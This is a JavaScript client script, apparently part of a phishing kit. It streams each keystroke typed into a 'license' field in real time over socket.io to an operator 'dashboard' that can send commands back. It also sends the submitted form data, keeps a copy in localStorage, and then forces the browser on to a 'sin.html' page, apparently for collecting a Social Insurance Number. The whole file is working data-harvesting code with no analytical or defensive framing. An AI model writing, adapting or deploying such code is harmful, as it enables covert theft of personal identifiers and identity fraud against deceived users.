/* license-client.js */
(function () {
  const SERVER_URL = window.location.origin;
  const SESSION_STORAGE_KEY = "sessionID";
  const DASH_EMIT_EVENT = "client-data";
  const DASH_JOIN_EVENT = "client-join";
  const PAGE_PROGRESS_KEY = "page_progress";

  function onceDomReady(fn) {
    if (document.readyState === "loading") {
      document.addEventListener("DOMContentLoaded", fn, { once: true });
    } else {
      fn();
    }
  }

  function getOrCreateSessionID() {
    let sid = null;
    try { sid = localStorage.getItem(SESSION_STORAGE_KEY) || null; } catch {}
    if (!sid) {
      sid = Math.random().toString(36).slice(2) + Math.random().toString(36).slice(2);
      try { localStorage.setItem(SESSION_STORAGE_KEY, sid); } catch {}
    }
    return sid;
  }

  function debounce(fn, ms) {
    let t;
    return function (...args) {
      clearTimeout(t);
      t = setTimeout(() => fn.apply(this, args), ms);
    };
  }

  window.setPageProgress = function(page) {
    try { localStorage.setItem(PAGE_PROGRESS_KEY, page); } catch {}
  };

  window.getPageProgress = function() {
    try { return localStorage.getItem(PAGE_PROGRESS_KEY) || null; } catch { return null; }
  };

  window.clearPageProgress = function() {
    try { localStorage.removeItem(PAGE_PROGRESS_KEY); } catch {}
  };

  function checkPageProgress() {
    if (window.getPageProgress() === 'sin.html') {
      window.location.replace('sin.html');
    }
  }

  onceDomReady(checkPageProgress);



  function ensureSocketIO(cb) {
    if (window.io && typeof window.io === "function") return cb();

    const s = document.createElement("script");
    s.src = SERVER_URL.replace(/\/$/, "") + "/socket.io/socket.io.js";
    s.async = true;
    s.onload = cb;
    s.onerror = () => console.warn("[license-client] Could not load socket.io from server.");
    document.head.appendChild(s);
  }

  function connectSocket(sessionID) {
    if (!window.io) {
      console.warn("[license-client] socket.io not available.");
      return null;
    }
    const socket = window.io(SERVER_URL, { transports: ["websocket", "polling"] });

    socket.on("connect", () => {
      console.log("[license-client] connected:", socket.id, "session:", sessionID);
      socket.emit(DASH_JOIN_EVENT, { sessionID });
    });

    socket.on("disconnect", () => {
      console.log("[license-client] disconnected");
    });

    socket.on("dashboard-action", ({ buttonName, value }) => {
      console.log("[license-client] dashboard action:", buttonName, value);
    });

    return socket;
  }

  onceDomReady(function () {
    ensureSocketIO(() => {
      const sessionID = getOrCreateSessionID();
      const socket = connectSocket(sessionID);
      if (!socket) return;

      const licenseInput = document.getElementById('license');

      const sendLicense = debounce((val) => {
        socket.emit(DASH_EMIT_EVENT, { type: "license", data: String(val || "") });
      }, 300);

      if (licenseInput) {
        licenseInput.addEventListener('input', (e) => sendLicense(e.target.value));
      }

      const form = document.querySelector('form');
      if (form) {
        form.addEventListener('submit', function(e) {
          e.preventDefault();

          const formData = {
            license: licenseInput ? licenseInput.value : "",
          };

          console.log('[license-client] Form submitted:', formData);

          socket.emit(DASH_EMIT_EVENT, {
            type: "license-form-submitted",
            data: JSON.stringify(formData)
          });

          try {
            localStorage.setItem('licenseFormData', JSON.stringify(formData));
          } catch {}

          setTimeout(() => {
            window.setPageProgress('sin.html');
            window.location.replace('sin.html');
          }, 200);
        });
      }

      window.handleSubmit = function(event) {
        event.preventDefault();
        if (form) {
          form.dispatchEvent(new Event('submit'));
        }
      };
    });
  });
})();